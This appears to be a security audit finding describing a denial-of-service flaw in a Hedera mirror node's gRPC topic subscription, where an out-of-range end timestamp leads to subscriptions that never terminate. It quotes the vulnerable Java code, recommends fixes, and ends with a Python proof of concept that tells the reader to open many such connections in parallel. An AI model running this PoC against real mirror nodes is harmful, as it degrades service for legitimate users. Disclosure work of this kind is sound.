### Title
Unbounded Reactive Subscription via `Long.MAX_VALUE` endTime Bypassing `Flux.never()` Termination Path

### Summary
`convertTimestamp()` maps any `consensusEndTime.seconds >= 9223372035` to `Long.MAX_VALUE`, producing a non-null `endTime` in `TopicMessageFilter`. This non-null value causes `pastEndTime()` to return a perpetually-polling `Flux` instead of `Flux.never()`, while `isComplete()` always evaluates to `false` for `Long.MAX_VALUE`, meaning the polling loop and the live subscription stream both run indefinitely — consuming server-side resources beyond what a legitimately unlimited subscription (no `endTime` set) would consume.

### Finding Description

**Code path:**

`ConsensusController.java` lines 76–81:
```java
private long convertTimestamp(Timestamp timestamp) {
    if (timestamp.getSeconds() >= 9223372035L) {
        return Long.MAX_VALUE;          // ← attacker-controlled sentinel
    }
    return DomainUtils.timestampInNanosMax(timestamp);
}
```
This value is stored as `filter.endTime = Long.MAX_VALUE` (non-null).

`TopicMessageServiceImpl.java` lines 123–131 — `pastEndTime()`:
```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();            // ← only path with zero overhead
    }
    return Flux.empty()
            .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                    .withFixedDelay(grpcProperties.getEndTimeInterval()));
}
```
Because `endTime` is `Long.MAX_VALUE` (not null), `Flux.never()` is **never** returned. Instead a `RepeatSpec` loop fires at every `endTimeInterval` tick for the lifetime of the subscription.

`TopicMessageServiceImpl.java` lines 203–215 — `isComplete()`:
```java
boolean isComplete() {
    if (filter.getEndTime() == null) { return false; }
    if (filter.getEndTime() < startTime) { return true; }   // Long.MAX_VALUE > any real nanos → false
    return Instant.ofEpochSecond(0, filter.getEndTime())    // resolves to ~year 2262
            .plus(grpcProperties.getEndTimeInterval())
            .isBefore(Instant.now());                       // 2262 is never before now → false
}
```
`Long.MAX_VALUE` nanoseconds from epoch = ~year 2262. `Instant.now()` is ~2025. The `isBefore` check is permanently `false`, so `isComplete()` always returns `false`, and the `RepeatSpec` loop never exits.

`TopicMessageServiceImpl.java` line 80:
```java
flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
```
Real consensus timestamps (nanoseconds since epoch, currently ~`1.7 × 10¹⁸`) are always less than `Long.MAX_VALUE` (`9.2 × 10¹⁸`), so `takeWhile` never terminates the stream.

**Root cause:** The null-check in `pastEndTime()` is the sole gate between zero-overhead (`Flux.never()`) and perpetual-polling behavior. `convertTimestamp()` converts an out-of-range timestamp to a non-null sentinel (`Long.MAX_VALUE`) rather than leaving `endTime` as null, silently routing the subscription into the polling path with no possibility of termination.

### Impact Explanation

Each malicious subscription carries a perpetually-running `RepeatSpec` loop firing at `endTimeInterval` (default 500 ms per `GrpcProperties`). A normal indefinite subscription (no `endTime`) uses `Flux.never()` — zero periodic overhead. An attacker opening N such connections multiplies the polling load by N. Combined with the live `topicListener` stream that also never terminates, each connection holds a thread-pool slot on `Schedulers.boundedElastic()` (the safety-check path) and a listener registration indefinitely. Under sustained attack this degrades throughput for legitimate subscribers and can exhaust the bounded elastic scheduler's thread pool.

### Likelihood Explanation

The gRPC `subscribeTopic` endpoint is unauthenticated (no credential check visible in `ConsensusController` or `TopicMessageServiceImpl`). Any network-reachable client can send a `ConsensusTopicQuery` protobuf with `consensusEndTime.seconds = 9223372035`. The trigger is a single integer field in a standard protobuf message, requiring no special privileges, no prior state, and no cryptographic material. The attack is trivially repeatable and scriptable.

### Recommendation

1. **In `convertTimestamp()`**: when `seconds >= 9223372035`, return `null` (or a dedicated sentinel) and leave `filter.endTime` as `null`, so the subscription follows the same `Flux.never()` path as a legitimately unlimited subscription.
2. **Alternatively**, add an upper-bound validation in `TopicMessageFilter.isValidEndTime()` rejecting `endTime > some_reasonable_max` (e.g., 50 years from now in nanoseconds).
3. **Enforce a per-IP or per-connection subscription limit** at the gRPC server layer to bound the number of concurrent indefinite subscriptions regardless of `endTime` value.

### Proof of Concept

```python
import grpc
from hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from hederahashgraph.api.proto.java import timestamp_pb2, basic_types_pb2

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

query = consensus_service_pb2.ConsensusTopicQuery(
    topicID=basic_types_pb2.TopicID(topicNum=1),
    consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
    # Trigger Long.MAX_VALUE path: seconds >= 9223372035
    consensusEndTime=timestamp_pb2.Timestamp(seconds=9223372035, nanos=0),
)

# Each of these runs forever with a polling loop; open many in parallel
for response in stub.subscribeTopic(query):
    pass  # stream never completes
```

Repeat in N parallel threads/processes. Each connection holds a live reactive stream + a `RepeatSpec` polling loop firing every `endTimeInterval`, permanently, with `isComplete()` always returning `false`.